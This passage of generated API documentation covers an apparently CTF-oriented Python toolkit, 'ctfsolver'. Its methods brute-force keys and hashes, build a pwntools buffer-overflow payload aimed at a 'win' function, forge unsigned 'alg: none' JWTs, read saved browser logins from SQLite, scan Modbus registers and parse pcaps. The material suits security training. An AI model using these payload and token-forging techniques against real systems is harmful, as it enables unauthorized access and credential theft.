<pre><code class="python">def attempt_for_loop_subkeys(self):
    skew1_key = self.hive.get_key(r&#34;\ControlSet001\Control\Lsa&#34;)

    for subkey in skew1_key.iter_subkeys():
        # print(f&#34;Subkey: {subkey.name}, &#34;)
        if subkey.name == &#34;Skew1&#34;:
            # print(f&#34;Found Skew1 subkey: {subkey.name}&#34;)
            # for subvalue in subkey.iter_values
            print(self.get_functions(subkey))
            # print(self.get_attributes(subkey))
            print(dir(subkey))
            # skew1_subkey = subkey._parse_subkeys()
            # print(f&#34;Skew1 Subkey: {skew1_subkey}&#34;)
            for sub_subkey in subkey.iter_subkeys():
                print(
                    f&#34;Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}&#34;
                )

            print(f&#34;Values - {subkey.name}:&#34;)
            for value in subkey.iter_values():
                print(f&#34;  Value Name: {value.name}, Value Data: {value.value}&#34;)
            for sub_subkey in subkey.iter_subkeys():
                print(
                    f&#34;Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}&#34;
                )

    # Using this to get all the subkeys
    # for i in skew1_key.iter_subkeys():
    #     print(i.name, i.value.)

    # for i in skew1_key.iter_values():
    #     if i.name == &#34;SkewMatrix&#34;:
    #         print(&#34;Found SkewMatrix value:&#34;)
    #         return i.value
    #     print(i.name, i.value)

    # class_name = skew1_key.header.class_name
    # print(f&#34;Class Name: {class_name}&#34;)
    # values = skew1_key.values()
    # print(f&#34;Values: {values}&#34;)

    # print(control_set.read_value())
    # print(control_set.get_class_name())

    # skew1 = self.hive.open(&#34;ControlSet001\\Control\\Lsa\\Skew1&#34;)

    # offset =
    return</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bits_to_ascii"><code class="name flex">
<span>def <span class="ident">bits_to_ascii</span></span>(<span>self, bits)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bits_to_ascii(self, bits):
    &#34;&#34;&#34;
    Convert a list of bits (ints) to ASCII string.
    Assumes 8 bits per character, MSB first.
    &#34;&#34;&#34;
    if len(bits) % 8 != 0:
        # Pad with zeros if not multiple of 8
        raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
    chars = []
    for i in range(0, len(bits), 8):
        byte = bits[i : i + 8]
        val = 0
        for bit in byte:
            val = (val &lt;&lt; 1) | bit
        chars.append(chr(val))
    return &#34;&#34;.join(chars)</code></pre>
</details>
<div class="desc"><p>Convert a list of bits (ints) to ASCII string.
Assumes 8 bits per character, MSB first.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.breakfiles"><code class="name flex">
<span>def <span class="ident">breakfiles</span></span>(<span>self, exfiltrated_data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def breakfiles(self, exfiltrated_data):

    lines = []
    counter = 0
    delimiters = [
        &#34;From&#34;,
        &#34;UEsDBg&#34;,
        &#34;--boundary_AA&#34;,
        &#34;UEsDBg&#34;,
        &#34;Content-Transfer-Encoding: base64&#34;,
    ]

    for line in exfiltrated_data.splitlines():
        if line.startswith(tuple(delimiters)):
            lines.append([])
            counter += 1
        if line != &#34;\n&#34;:
            lines[counter - 1].append(line)

    for i in range(1, counter + 1):
        with open(self.folfil(&#34;data&#34;, f&#34;basefile_{i}.txt&#34;), &#34;w&#34;) as f:
            f.write(&#34;\n&#34;.join(lines[i - 1]))</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.brute_ascii_rot"><code class="name flex">
<span>def <span class="ident">brute_ascii_rot</span></span>(<span>self, text, identifier)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def brute_ascii_rot(self, text, identifier):
    &#34;&#34;&#34;
    Description:
        Brute forces the rotation of ASCII characters in a string

    Args:
        text (str): The text to rotate
        identifier (str): The string to search for in the rotated text

    Returns:
        str: The rotated text
    &#34;&#34;&#34;
    for j in range(200):
        flag = self.ascii_rot(text, j)
        if identifier in flag:
            print(j)
            return flag</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Brute forces the rotation of ASCII characters in a string</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>text</code></strong> :&ensp;<code>str</code></dt>
<dd>The text to rotate</dd>
<dt><strong><code>identifier</code></strong> :&ensp;<code>str</code></dt>
<dd>The string to search for in the rotated text</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The rotated text</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.brute_force"><code class="name flex">
<span>def <span class="ident">brute_force</span></span>(<span>self, encrypted_data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def brute_force(self, encrypted_data):

    for shift in range(27):
        pt = self.juilius_decrypt(encrypted_data, shift)
        if &#34;HTB&#34; in pt:
            return pt</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.brute_transpose_find_flag"><code class="name flex">
<span>def <span class="ident">brute_transpose_find_flag</span></span>(<span>self,<br>lyrics:str,<br>partial_flag:str,<br>keys:list,<br>verbose:bool=False,<br>wrap:bool=True)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def brute_transpose_find_flag(
    self,
    lyrics: str,
    partial_flag: str,
    keys: list,
    verbose: bool = False,
    wrap: bool = True,
):
    &#34;&#34;&#34;
    Description:
        For the lyrics given

    Args:
        lyrics (str): Lyrics given
        partial_flag (str): partial flag to look
        verbose (bool, optional): _description_. Defaults to False.

    Returns:
        str: possible flag
    &#34;&#34;&#34;

    for i in range(len(lyrics)):
        transposed = self.lyric_transpose(lyrics, i, wrap=wrap)
        if verbose and i % 100 == 0:
            print(f&#34;Trying offset: {i}&#34;)
        temp_flag = self.position_cipher(transposed, keys)
        if &#34;ecsc&#34; in temp_flag.lower() or self.check_for_rot(
            temp_flag, partial_flag
        ):
            print(f&#34;Found flag: {temp_flag} - Offset: {i}&#34;)
            return temp_flag</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>For the lyrics given</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>lyrics</code></strong> :&ensp;<code>str</code></dt>
<dd>Lyrics given</dd>
<dt><strong><code>partial_flag</code></strong> :&ensp;<code>str</code></dt>
<dd>partial flag to look</dd>
<dt><strong><code>verbose</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd><em>description</em>. Defaults to False.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>possible flag</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bruteforce"><code class="name flex">
<span>def <span class="ident">bruteforce</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bruteforce(self):
    self.users = {
        &#34;HTBUser132&#34;: [md5(b&#34;HTBUser132&#34;).hexdigest(), &#34;secure123!&#34;],
        &#34;JohnMarcus&#34;: [md5(b&#34;JohnMarcus&#34;).hexdigest(), &#34;0123456789&#34;],
    }

    # The target hash for &#34;HTBUser 132&#34;
    self.target_hash = self.md5_hash(&#34;HTBUser132&#34;)

    self.collision = self.find_collision(
        self.target_hash,
        max_length=len(&#34;HTBUser132&#34;),
        prefix=&#34;&#34;,
        suffix=&#34;&#34;,
        lengthy=True,
    )
    print(
        f&#34;Found collision: {self.collision} with hash: {self.md5_hash(self.collision)}&#34;
    )</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bruteforce_address"><code class="name flex">
<span>def <span class="ident">bruteforce_address</span></span>(<span>self, start=0, number=1000, count=125, verbose=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bruteforce_address(self, start=0, number=1000, count=125, verbose=False):
    if start &gt; number:
        raise ValueError(
            &#34;Start address must be less than the number of addresses to check.&#34;
        )
    for i in range(start, number):
        result = self.client.read_holding_registers(address=i, count=count)

        if any(result.registers) and result.registers[-1] == 0:
            return i
        if verbose:
            print(f&#34;Reading holding registers at address {i}...&#34;)
            if not result.isError():
                print(&#34;Registers:&#34;, result.registers)
            else:
                print(&#34;Error reading registers:&#34;, result)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bruteforce_all_lyrics"><code class="name flex">
<span>def <span class="ident">bruteforce_all_lyrics</span></span>(<span>self,<br>all_lyrics:list,<br>partial_flag:str,<br>keys:list,<br>verbose:bool=False,<br>wrap:bool=True)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bruteforce_all_lyrics(
    self,
    all_lyrics: list,
    partial_flag: str,
    keys: list,
    verbose: bool = False,
    wrap: bool = True,
):
    results = []
    for lyric_i, lyrics in enumerate(all_lyrics):
        if verbose:
            print(f&#34;Processing lyrics {lyric_i + 1}/{len(all_lyrics)}&#34;)
        result = self.brute_transpose_find_flag(
            lyrics=lyrics,
            partial_flag=partial_flag,
            keys=keys,
            verbose=verbose,
            wrap=wrap,
        )
        if result:
            results.append([lyric_i, result])

    return results</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bruteforce_key"><code class="name flex">
<span>def <span class="ident">bruteforce_key</span></span>(<span>self, verbose=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bruteforce_key(self, verbose=False):
    found_key = None
    for key_canditate in itertools.product(range(256), repeat=8):
        if verbose:
            print(f&#34;Trying key: {bytes(key_canditate).hex()}&#34;)
        key_bytes = bytes(key_canditate)
        if self.try_key(key_bytes):
            found_key = key_bytes
            print(&#34;Key found:&#34;, found_key.hex())
            break
    return found_key</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bruteforce_key_multiprocessing"><code class="name flex">
<span>def <span class="ident">bruteforce_key_multiprocessing</span></span>(<span>self, verbose=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bruteforce_key_multiprocessing(self, verbose=False):
    &#34;&#34;&#34;
    Multiprocessing brute-force key search.
    &#34;&#34;&#34;
    found_key = None

    with Pool(processes=cpu_count() - 8) as pool:
        key_candidates = itertools.product(range(256), repeat=8)
        # Pass both key candidates and pairs to the worker
        args = ((key_candidate, self.pairs) for key_candidate in key_candidates)
        for result in pool.imap(worker, args):
            if result:
                found_key = result
                print(&#34;Key found:&#34;, found_key.hex())
                pool.terminate()  # Stop other processes
                break

    return found_key</code></pre>
</details>
<div class="desc"><p>Multiprocessing brute-force key search.</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bruteforcer"><code class="name flex">
<span>def <span class="ident">bruteforcer</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bruteforcer(self):

    print(&#34;[*] Brute-forcing keys with known prefix:&#34;, self.known_prefix)

    for length in range(5, 30):  # keep short for demonstration
        for suffix in product(self.charset, repeat=length - len(self.known_prefix)):
            candidate_key = self.known_prefix + &#34;&#34;.join(suffix)
            result = self.try_key(candidate_key)
            print(candidate_key, result)
            if (
                result
                and result.startswith(self.flag_prefix)
                and result[-1] == ord(&#34;}&#34;)
            ):
                print(&#34;[+] Found key:&#34;, candidate_key)
                print(&#34;[+] Flag:&#34;, result.decode(errors=&#34;ignore&#34;))
                return

    print(&#34;[-] No valid flag found.&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bruteforcing"><code class="name flex">
<span>def <span class="ident">bruteforcing</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bruteforcing(self):
    for pw in self.pos_pw_list:
        user_pw_hash = self.hash_pw(pw)
        if user_pw_hash == self.correct_pw_hash:
            return pw</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bruteforcing_failed"><code class="name flex">
<span>def <span class="ident">bruteforcing_failed</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bruteforcing_failed(self):

    flag = &#34;&#34;
    for i in range(len(self.KEY)):
        # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
        flag += ascii_letters[(self.KEY[i]) % len(ascii_letters)]
    self.flag = flag

    print(self.flag)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.build_payload"><code class="name flex">
<span>def <span class="ident">build_payload</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def build_payload(self):
    self.payload = b&#34;A&#34; * 32
    self.get_address()
    length = len(hex(self.win_address)) - 2
    self.payload += self.pwn.p32(int(self.win_address, 16))
    self.payload += self.pwn.p32(self.win_address)
    # self.payload = self.payload[:-2]
    # self.payload += b&#34;\x40&#34;

    self.payload += struct.pack(&#34;&gt;I&#34;, self.win_address)
    self.payload = self.payload[:-2]
    self.payload += b&#34;\x40&#34;

    length = (16 - length) // 2
    for _ in range(length):
        self.payload += b&#34;\x00&#34;</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.bytes_to_int_array"><code class="name flex">
<span>def <span class="ident">bytes_to_int_array</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def bytes_to_int_array(self, data):
    &#34;&#34;&#34;Convert bytes to array of integers&#34;&#34;&#34;
    return [b for b in data]</code></pre>
</details>
<div class="desc"><p>Convert bytes to array of integers</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.challenge_get_offset_address"><code class="name flex">
<span>def <span class="ident">challenge_get_offset_address</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def challenge_get_offset_address(self):
    offset = self.get_elf_function_address(&#34;main&#34;) - self.get_elf_function_address(
        &#34;win&#34;
    )
    return offset</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.check_for_rot"><code class="name flex">
<span>def <span class="ident">check_for_rot</span></span>(<span>self, text, partial='ecsc')</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def check_for_rot(self, text, partial=&#34;ecsc&#34;):
    &#34;&#34;&#34;
    Description:
        Checks if the text is a rotation of &#34;ecsc&#34;.
        This function checks if the first four characters of the text
        can be rearranged to form the string &#34;ecsc&#34;. It does this by
        comparing the ASCII values of the characters in the text with
        the ASCII values of the characters in &#34;ecsc&#34;. If the conditions
        are met, it returns True, indicating that the text is a rotation
        of &#34;ecsc&#34;. Otherwise, it returns False.
        This function is useful for identifying specific patterns in the text
        that match the structure of &#34;ecsc&#34;, which could be relevant in certain

        Challenge_specific
    Args:
        text (_type_): _description_

    Returns:
        _type_: _description_
    &#34;&#34;&#34;

    if len(partial) != 4:
        raise ValueError(
            &#34;Partial must be exactly 4 characters long. Challenge_specific&#34;
        )
    text = text.lower()

    check1 = (ord(partial[0]) - ord(partial[1])) == (ord(text[0]) - ord(text[1]))
    check2 = (ord(partial[2]) - ord(partial[1])) == (ord(text[2]) - ord(text[1]))
    check3 = ord(text[3]) == ord(text[1])

    return check1 and check2 and check3</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Checks if the text is a rotation of "ecsc".
This function checks if the first four characters of the text
can be rearranged to form the string "ecsc". It does this by
comparing the ASCII values of the characters in the text with
the ASCII values of the characters in "ecsc". If the conditions
are met, it returns True, indicating that the text is a rotation
of "ecsc". Otherwise, it returns False.
This function is useful for identifying specific patterns in the text
that match the structure of "ecsc", which could be relevant in certain</p>
<p>Challenge_specific</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>text</code></strong> :&ensp;<code>_type_</code></dt>
<dd><em>description</em></dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>_type_</code></dt>
<dd><em>description</em></dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.check_password_time"><code class="name flex">
<span>def <span class="ident">check_password_time</span></span>(<span>self, length)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def check_password_time(self, length):
    start_time = time.time()
    for i in range(length):
        for _ in range(10000):
            pass
        return time.time() - start_time
    return time.time() - start_time</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.connecting_db"><code class="name flex">
<span>def <span class="ident">connecting_db</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def connecting_db(self):
    with sqlite3.connect(self.challenge_file) as conn:
        cursor = conn.cursor()
        cursor.execute(
            &#34;SELECT action_url, username_value, password_value FROM logins&#34;
        )
        return cursor.fetchall()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.context"><code class="name flex">
<span>def <span class="ident">context</span></span>(<span>self, number)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def context(self, number):
    if 0 &lt;= number &lt;= 25:
        # Uppercase
        return chr(ord(&#34;A&#34;) + number)
    elif 26 &lt;= number &lt;= 35:
        # Numbers
        return chr(ord(&#34;0&#34;) + number - 26)
    elif number == 36:
        return &#34;_&#34;
    else:
        return str(number)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.copy"><code class="name flex">
<span>def <span class="ident">copy</span></span>(<span>self, file1, file2)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def copy(self, file1, file2):
    with open(file1, &#34;rb&#34;) as f:
        data = f.read(2048 * 2048)
        with open(file2, &#34;wb&#34;) as f2:
            f2.write(data)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.create_token"><code class="name flex">
<span>def <span class="ident">create_token</span></span>(<span>self, username)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def create_token(self, username):
    header = {&#34;alg&#34;: &#34;none&#34;, &#34;typ&#34;: &#34;JWT&#34;}
    return jwt.encode(
        {&#34;username&#34;: username}, key=None, algorithm=&#34;none&#34;, headers=header
    )</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.creating_control_combos"><code class="name flex">
<span>def <span class="ident">creating_control_combos</span></span>(<span>self, start=0, end=1, number=8)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def creating_control_combos(self, start=0, end=1, number=8):
    if start &gt;= end:
        raise ValueError(&#34;Start must be less than end.&#34;)
    if number &lt; 1:
        raise ValueError(&#34;Number of combinations must be at least 1.&#34;)
    return list(itertools.product(range(start, end + 1), repeat=number))</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.creating_stream"><code class="name flex">
<span>def <span class="ident">creating_stream</span></span>(<span>self, packets=None, save=False, return_dict=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def creating_stream(self, packets=None, save=False, return_dict=False):

    if packets is None:
        packets = self.packets

    # Dictionary to hold streams
    tcp_streams = {}

    # Iterate over packets to group them into streams
    for pkt in packets:
        if TCP in pkt:
            stream_id = self.stream_identifier(pkt)
            if stream_id:
                if stream_id not in tcp_streams:
                    tcp_streams[stream_id] = []
                tcp_streams[stream_id].append(pkt)

    if return_dict:
        return tcp_streams

    tcp_streams = list(tcp_streams.values())

    return tcp_streams</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.csend"><code class="name flex">
<span>def <span class="ident">csend</span></span>(<span>self, contract:str, fn:str, *args)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def csend(self, contract: str, fn: str, *args):
    print(
        f&#34;cast send {contract} &#39;{fn}&#39; --rpc-url  {self.RPC_URL} --private-key {self.pvk}&#34;
    )
    system(
        f&#34;cast send {contract} &#39;{fn}&#39; --rpc-url {self.RPC_URL} --private-key {self.pvk}&#34;
    )</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.current_initiate_connection"><code class="name flex">
<span>def <span class="ident">current_initiate_connection</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def current_initiate_connection(self):
    self.connect(self.conn_type)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.custom_init"><code class="name flex">
<span>def <span class="ident">custom_init</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def custom_init(self):
    self.folder_files = self.Path(self.folder_files, &#34;challenge&#34;)
    self.library = self.Path(self.folder_files, &#34;glibc&#34;)
    self.challenge_file = self.Path(self.folder_files, self.file)

    self.pwn.context.binary = self.Path(self.challenge_file)

    self.env = {&#34;LD_PRELOAD&#34;: self.library.as_posix()}</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.custom_packet_997_attempt"><code class="name flex">
<span>def <span class="ident">custom_packet_997_attempt</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def custom_packet_997_attempt(self):
    stream_4 = self.custom_stream_extract(stream_num=4)
    decrypted_data = self.dec_file_mes(stream_4[997].load, self.encryption_key)
    # print(decrypted_data)
    md5_hash = hashlib.md5(decrypted_data).hexdigest()
    print(&#34;MD5 Hash of the byte string:&#34;, md5_hash)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.custom_re_match_base64_string"><code class="name flex">
<span>def <span class="ident">custom_re_match_base64_string</span></span>(<span>self, text:str, strict=False) >list[str]</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def custom_re_match_base64_string(self, text: str, strict=False) -&gt; list[str]:
    &#34;&#34;&#34;
    Description:
    Find the base64 string in the text

    Args:
        text (str): Text to search for base64 string
        strict (bool, optional): If True, it will only return the base64 string. Defaults to False.

    Returns:
        str: list of Base64 string found in the text
    &#34;&#34;&#34;
    if strict:
        base64_pattern = r&#34;[A-Za-z0-9+/]{70,}={1,2}&#34;
    else:
        base64_pattern = r&#34;[A-Za-z0-9+/]{70,}={0,2}&#34;
    base64_strings = re.findall(base64_pattern, text)
    return base64_strings</code></pre>
</details>
<div class="desc"><p>Description:
Find the base64 string in the text</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>text</code></strong> :&ensp;<code>str</code></dt>
<dd>Text to search for base64 string</dd>
<dt><strong><code>strict</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>If True, it will only return the base64 string. Defaults to False.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>list of Base64 string found in the text</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.custom_stream_extract"><code class="name flex">
<span>def <span class="ident">custom_stream_extract</span></span>(<span>self, packets, stream_num=None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def custom_stream_extract(self, packets, stream_num=None):
    &#34;&#34;&#34;
    Description:
        Extracts the packets from the pcap file and saves them as a numbered dictionary.
        Can use either scapy or pyshark to extract the packets.

    Args:
        packets (dict): Dictionary of packets
        stream_num (int): Stream number to extract

    Returns:
        dict: Dictionary of packets
    &#34;&#34;&#34;

    packets_scapy = self.smart_extract_packets(
        self.challenge_file,
        pcap_function=&#34;scapy&#34;,
        save=True,
        filename_save=&#34;packets_scapy.pickle&#34;,
    )

    packets_pyshark = self.smart_extract_packets(
        self.challenge_file,
        pcap_function=&#34;pyshark&#34;,
        save=True,
        filename_save=&#34;packets_pyshark.pickle&#34;,
    )

    packet_dict = {}
    for i, packet in packets_pyshark.items():
        if packet.tcp.stream == stream_num:
            packet_dict[i] = packets_scapy[i]
    return packet_dict</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Extracts the packets from the pcap file and saves them as a numbered dictionary.
Can use either scapy or pyshark to extract the packets.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>packets</code></strong> :&ensp;<code>dict</code></dt>
<dd>Dictionary of packets</dd>
<dt><strong><code>stream_num</code></strong> :&ensp;<code>int</code></dt>
<dd>Stream number to extract</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>dict</code></dt>
<dd>Dictionary of packets</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.data_processing"><code class="name flex">
<span>def <span class="ident">data_processing</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def data_processing(self, data):

    output = &#34;&#34;.join(data.split(&#34;(nil)&#34;))

    output = output.strip(&#34;0x&#34;).split(&#34;0x&#34;)
    temp = []

    for item in output:
        temp_word = &#34;&#34;
        if len(item) == 8:
            for i in range(0, 8, 2):
                temp_word = item[i : i + 2] + temp_word
            temp_word = self.from_hex(temp_word)
            temp.append(temp_word)
        else:

            temp.append(self.from_hex(item))

    output = temp
    output = &#34;&#34;.join(output)
    return output</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.de_hexing_flag"><code class="name flex">
<span>def <span class="ident">de_hexing_flag</span></span>(<span>self, flag)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def de_hexing_flag(self, flag):
    flag = flag[0].decode(&#34;utf-8&#34;).strip(&#34;\n&#34;).strip(&#34; &#34;)
    flag = [chr(int(letter, 16)) for letter in flag.split(&#34; &#34;)]
    flag = &#34;&#34;.join(flag)
    return flag</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.dec_file_mes"><code class="name flex">
<span>def <span class="ident">dec_file_mes</span></span>(<span>self, mes, key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def dec_file_mes(self, mes, key):
    cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

    return unpad(cypher.decrypt(mes), 16)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decode_address"><code class="name flex">
<span>def <span class="ident">decode_address</span></span>(<span>self, address_all, start=0, end=None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decode_address(self, address_all, start=0, end=None):
    &#34;&#34;&#34;
    Description:
        Decodes the address of the stack

    Args:
        address_all (list): List of addresses
        start (int, optional): Starting position of the address. Defaults to 0.
        end ([type], optional): Ending position of the address. Defaults to None.

    Returns:
        bytes: Decoded text of the address
    &#34;&#34;&#34;
    decoded_text = b&#34;&#34;

    if end is None:
        end = len(address_all)

    for i in range(start, end):
        decoded_text += self.pwn.p64(int(address_all[i], 16))
    return decoded_text</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Decodes the address of the stack</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>address_all</code></strong> :&ensp;<code>list</code></dt>
<dd>List of addresses</dd>
<dt><strong><code>start</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>Starting position of the address. Defaults to 0.</dd>
<dt><strong><code>end</code></strong> :&ensp;<code>[type]</code>, optional</dt>
<dd>Ending position of the address. Defaults to None.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>bytes</code></dt>
<dd>Decoded text of the address</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.decode_hamming74"><code class="name flex">
<span>def <span class="ident">decode_hamming74</span></span>(<span>self, encoded_bits)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def decode_hamming74(self, encoded_bits):
    &#34;&#34;&#34;
    Decode a Hamming (7,4) encoded bit string to ASCII.
    Each 7 bits contain 4 data bits and 3 parity bits.
    Returns ASCII decoded string.
    &#34;&#34;&#34;

    def hamming_correct_and_extract(bits7):
        # bits7 is a list of 7 bits (ints)
        # Hamming (7,4) bit positions (1-based):
        # Positions: 1 2 3 4 5 6 7
        # Bits:      p1 p2 d1 p3 d2 d3 d4
        # parity bits: p1=bit1, p2=bit2, p3=bit4
        p1, p2, d1, p3, d2, d3, d4 = bits7
        # Calculate syndrome bits
        s1 = p1 ^ d1 ^ d2 ^ d4
        s2 = p2 ^ d1 ^ d3 ^ d4
        s3 = p3 ^ d2 ^ d3 ^ d4
